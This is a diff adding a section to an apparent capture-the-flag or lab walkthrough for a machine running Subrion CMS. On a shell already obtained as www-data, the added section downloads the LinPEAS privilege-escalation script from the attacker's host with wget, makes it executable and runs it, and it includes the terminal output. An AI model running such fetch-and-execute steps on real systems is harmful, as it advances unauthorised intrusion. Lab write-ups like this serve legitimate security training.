@@ -119,3 +119,34 @@ Host http server:
 python3 -m http.server 8000
 ```
 
+On the shell you opened:
+
+```
+wget http://192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+Output:
+
+```
+www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+<//192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
+--2025-04-11 03:47:49--  http://192.168.45.233:8000/linpeas.sh
+Connecting to 192.168.45.233:8000... chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 840085 (820K) [text/x-sh]
+Saving to: ‘/tmp/linpeas.sh’
+
+/tmp/linpeas.sh     100%[===================>] 820.40K  3.54MB/s    in 0.2s    
+
+2025-04-11 03:47:49 (3.54 MB/s) - ‘/tmp/linpeas.sh’ saved [840085/840085]
+
+www-data@exfiltrated:/var/www/html/subrion/uploads$ chmod +x /tmp/linpeas.sh
+www-data@exfiltrated:/var/www/html/subrion/uploads$ /tmp/linpeas.sh
+```
+
